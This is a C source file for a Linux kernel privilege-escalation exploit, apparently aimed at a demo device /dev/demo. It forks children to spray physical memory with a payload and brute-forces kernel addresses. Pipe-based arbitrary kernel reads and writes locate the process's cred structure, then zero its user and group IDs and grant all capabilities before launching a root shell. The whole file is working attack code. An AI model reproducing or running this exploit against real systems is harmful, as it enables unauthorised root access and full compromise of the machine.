#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <string.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include "extra_struct.h"
#define PATH_SZ 32 /* path size (/proc/<pid>/statm) */
#define PAGE_SIZE 4096
#define ALLOC_STEP PAGE_SIZE*1024*128 /* 512MB memory chunk */
#define max_num_children 20
#define PAGE_OFFSET 0xffff880000000000UL    /* kernel space */
#define KERN_LOW    PAGE_OFFSET     /* range start */
#define KERN_HIGH   0xffff880080000000UL    /* range end */
pid_t pid[max_num_children];
unsigned long pfn_idx, guess_pfn, max_pfn = (KERN_HIGH - KERN_LOW)/PAGE_SIZE;
FILE *fp = NULL;
static unsigned long map_addr, kaddr = 0UL;
static int count = 0;
static struct cred *cred = NULL;
struct thread_info *info;
//"copy to kernel" from writebuf to readbuf
ssize_t write_pipe(void *readbuf, void *writebuf, size_t count) {
    int pipefd[2];
    ssize_t len;

    pipe(pipefd);

    write(pipefd[1], writebuf, count);
    len = read(pipefd[0], readbuf, count);

    if (len != count) {
        printf("___FAILED WRITE @ %p : %d %d\n", readbuf, (int)len, errno);
        while (1) {
            sleep(10);
        }
    }

    close(pipefd[0]);
    close(pipefd[1]);

    return len;
}
//"copy from kernel" from writebuf to readbuf
ssize_t read_pipe(void *writebuf, void *readbuf, size_t count) {
    int pipefd[2];
    ssize_t len;

    pipe(pipefd);

    len = write(pipefd[1], writebuf, count);

    if (len != count) {
        printf("___FAILED READ @ %p : %d %d\n", writebuf, (int)len, errno);
        while (1) {
            sleep(10);
        }
    }

    read(pipefd[0], readbuf, count);

    close(pipefd[0]);
    close(pipefd[1]);

    return len;
}
int read_statm() {
    char in[32];
    int vsz = -1;
    int rss = -1;
    int pid = getpid();
    printf("pid : %d\n", pid);
    /* path in /proc    */
    char path[PATH_SZ];
    FILE *fp = NULL;
    /* format the path variable */
    if (snprintf(path, PATH_SZ, "/proc/%d/statm",pid) >= PATH_SZ) {
          // failed
          printf("[-] failed to set the path for " \
                     "/proc/%d/statm", pid);
        exit(1);
      }
    /* open the statm file */
    if ((fp = fopen(path, "r")) == NULL) {
          // failed 
          printf("[-] failed to open");
          exit(1);
      }
    if (fgets(in, 1024, fp) != NULL ) {
          sscanf(in, "%d %d", &vsz, &rss);
          printf("rss : %dKB\n\n", rss, rss*4);
		  return rss*4;
	} else {
          puts("fgets failed..");
          exit(1);
    }	
}
void
obtain_root_privilege_by_modify_task_cred(void)
{
    struct thread_info infobuff = {0};
    unsigned long addr_infobuff = {0};
    unsigned long taskbuf[0x100] = {0};
    struct cred credbuf = {0};
    struct task_security_struct *security = NULL;
    struct task_security_struct securitybuf = {0};
    int i;
	unsigned long tmp_cap[4];
    // read the thread_info addr.
    read_pipe((void*)kaddr, &addr_infobuff, sizeof(unsigned long));
    read_pipe((void*)addr_infobuff, &infobuff, sizeof(infobuff));
    printf("infobuff.addr_limit : %lx\n", infobuff.addr_limit);
    if ( infobuff.addr_limit == -1 )
            printf("[+] arbirty memory overwrite is success.\n");
    printf("task: %lx\n", infobuff.task);

    //dump the task_struct from the thread_info.
    read_pipe(infobuff.task, taskbuf, sizeof(taskbuf));

    for (i = 0; i < ARRAY_SIZE(taskbuf); i++) {
        struct task_struct_partial *task = (void *)&taskbuf[i];

        if (task->cpu_timers[0].next == task->cpu_timers[0].prev
            && (unsigned long)task->cpu_timers[0].next > KERNEL_START
            && task->cpu_timers[1].next == task->cpu_timers[1].prev
            && (unsigned long)task->cpu_timers[1].next > KERNEL_START
            && task->cpu_timers[2].next == task->cpu_timers[2].prev
            && (unsigned long)task->cpu_timers[2].next > KERNEL_START
            && task->real_cred == task->cred) {
                cred = task->cred;
                break;
        }
    }
    if ( cred == NULL ) {
        printf("[-]Not found the cred struct.\n");
        exit(1);
    }
    printf("task->cred : %lx\n", cred);
   
    //dump the cred struct.
    read_pipe(cred, &credbuf, sizeof(credbuf));

	/*
    security = credbuf.security;    
    if ((unsigned long)security > KERNEL_START ) {
        read_pipe(security, &securitybuf, sizeof(securitybuf));
        
        if (securitybuf.osid != 0
                && securitybuf.sid != 0
                && securitybuf.exec_sid == 0
                && securitybuf.create_sid == 0
                && securitybuf.keycreate_sid == 0
                && securitybuf.sockcreate_sid == 0) {
            securitybuf.osid = 1;
            securitybuf.sid = 1;

            printf("___task_security_struct: %p\n", security);

            //write_pipe(security, &securitybuf, sizeof securitybuf);
        }
    }   
    */
    credbuf.uid = 0;
    credbuf.gid = 0;
    credbuf.suid = 0;
    credbuf.sgid = 0;
    credbuf.euid = 0;
    credbuf.egid = 0;
    credbuf.fsuid = 0;
    credbuf.fsgid = 0;

    write_pipe((char*)cred+0x10, &credbuf.uid, sizeof(credbuf.uid)*8);
	
    credbuf.cap_inheritable.cap[0] = 0xffffffff;
    credbuf.cap_inheritable.cap[1] = 0xffffffff;
    credbuf.cap_permitted.cap[0] = 0xffffffff;
    credbuf.cap_permitted.cap[1] = 0xffffffff;
    credbuf.cap_effective.cap[0] = 0xffffffff;
    credbuf.cap_effective.cap[1] = 0xffffffff;
    credbuf.cap_bset.cap[0] = 0xffffffff;
    credbuf.cap_bset.cap[1] = 0xffffffff;
    write_pipe((char*)cred+0x14, &credbuf.cap_inheritable.cap[0], sizeof(tmp_cap));	
}
void issues() {
    printf("[+] Trying to kaddr : 0x%lx\n", kaddr);
    fwrite(&kaddr, sizeof(kaddr), 1, fp);
    fclose(fp);
	obtain_root_privilege_by_modify_task_cred();
	sleep(1);
    if ( getuid() == 0 ) {
	printf("my pid : %d\n",getpid());
	printf("uid = %d, euid = %d\n", getuid(), geteuid());
	puts("pw0ned!! You got the root.");
		
	while ( --count != -1 ) {
		printf("killed %d child\n",pid[count]);
		kill(pid[count], SIGINT);
	}
        execl("/bin/sh", "/bin/sh", NULL);
    } else
        puts("get root privilege failled...");
	
    exit(0);
}
void children() {
	unsigned long i;
	unsigned long tmp_map_addr;
	printf("I'm %d-th child\n", count);
    /* allocate ALLOC_STEP bytes in user space */
    if ((map_addr = (unsigned long)mmap(NULL,
                ALLOC_STEP,
                PROT_READ | PROT_WRITE,
                MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE /* important */,
                -1, 0)) == (unsigned long)MAP_FAILED) {

                /* failed */
                printf("[-] failed to mmap memory (%s), aborting!\n",
                     strerror(errno));
                exit(1);
        }
		//printf("map_addr : %lx\n", map_addr);
		//memset((void*)map_addr, 0x90, ALLOC_STEP);
		tmp_map_addr = map_addr;
		for ( i = 0; i < ALLOC_STEP/PAGE_SIZE; i++, tmp_map_addr+=4096)
			memcpy((void*)tmp_map_addr, gg, strlen(gg));

		//printf("virtual *map_addr : %lx\n", *(unsigned long *)gg );	
        while(1) *((char*)map_addr ) = 0x90;
    
		
		/*	
			if ( mlock((void*)map_addr, ALLOC_STEP) == -1 ) {
					perror("mlock");
					return;
			} 
			while(1);
		*/
}
int main() {
	unsigned long rss, rss_prev;
	char ch;
	pid_t child, endID;
	int i, status;
	printf("uid = %d, euid = %d\n\n", getuid(), geteuid());
	if ( (rss = read_statm()) < 1 )
		puts("[-] read_statm failed.");
	
	do{
		rss_prev = rss;	
		if((pid[count++] = fork()) == 0) 
			children();
		sleep(2);	
		rss = read_statm();
	} while ( rss >= rss_prev && count <= max_num_children );

	if( getpid() != 0 ) {
		puts("phymaps spraying is done...");	
		printf("P = MAX(N)/MIN_PFN - MAX_PFN, MAX_PFN = %lx\n", max_pfn); 	  
		/* trying the kaddr with payload */
		fp = fopen("/dev/demo", "w+");
		if( fp == NULL ) {
       		 puts("can't open device");
        	 return 0;
	    }
		
		for (pfn_idx = 0x5500; pfn_idx <= max_pfn; pfn_idx++) { 
			printf("Do you want to execute contiously[Y/n] ?\n");
			if ( getchar() != 'n') {
				for(i = 0; i < 0x1000 && pfn_idx <= max_pfn; pfn_idx++, i++) {
						if ( (child = fork()) == 0 ) { 
							kaddr = pfn_idx * PAGE_SIZE + PAGE_OFFSET + ( map_addr & (PAGE_SIZE -1) );
							issues();	
						} else if ( child > 0 ) {    /* This is the parent. */
								sleep(1);
								endID = waitpid(child, &status, 0);
								if ( endID == child ) {
										if (WIFEXITED(status)) {
											printf("Child ended normally.\n");
											while ( count != -1 ) kill(pid[count--], SIGINT);
											return 0;							
										}
						                else if (WIFSIGNALED(status)) {
											puts("Child got killed.");
											continue;
										}		
								}	
						}
				}
			} else 	break;
				
		}
		while ( count != -1 ) kill(pid[count--], SIGINT);
		puts("\nfinal step is failed...");
		return -1;
	 }
}

